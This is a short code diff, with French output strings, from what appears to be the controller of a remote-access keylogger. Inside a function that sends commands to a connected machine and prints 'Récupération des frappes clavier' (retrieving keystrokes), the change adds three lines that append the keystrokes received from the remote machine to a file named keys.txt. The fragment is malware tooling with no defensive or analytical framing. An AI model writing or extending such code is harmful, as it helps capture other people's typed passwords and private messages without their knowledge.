@@ -57,6 +57,9 @@ def send_commands(conn):
             conn.send(str.encode(cmd))
             print("Récupération des frappes clavier :\n")
             response = conn.recv(4096).decode("utf-8")
+            f = open( 'keys.txt', 'a' )
+            f.write(response)
+            f.close()
             print(response)
             continue
 
